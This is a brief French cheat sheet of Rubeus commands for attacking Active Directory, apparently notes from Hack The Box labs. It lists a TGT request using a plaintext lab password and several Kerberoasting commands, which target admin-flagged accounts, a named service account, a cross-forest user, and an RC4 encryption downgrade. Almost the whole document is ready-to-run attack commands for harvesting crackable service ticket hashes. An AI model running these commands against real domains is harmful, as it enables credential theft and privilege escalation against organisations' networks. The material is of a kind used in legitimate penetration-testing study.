

https://github.com/GhostPack/Rubeus


# ASKTGT

```powershell
.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:EIGHTEEN.HTB /nowrap /opsec /force
```


# KERBEROASTING


## Affiche les statistiques pour le kerberoasting

```powershell-session
.\Rubeus.exe kerberoast /stats
```

## Kerberoasting de users potentiellement admin

```powershell-session
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## Kerberoasting sur un user

```powershell-session
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

## Kerberoasting sur un user X-Forest

```powershell-session
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

## Kerberoasting et DOWNGRADE RC4 sur un user (Etype 23)(PRE WS2019)

```powershell-session
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```







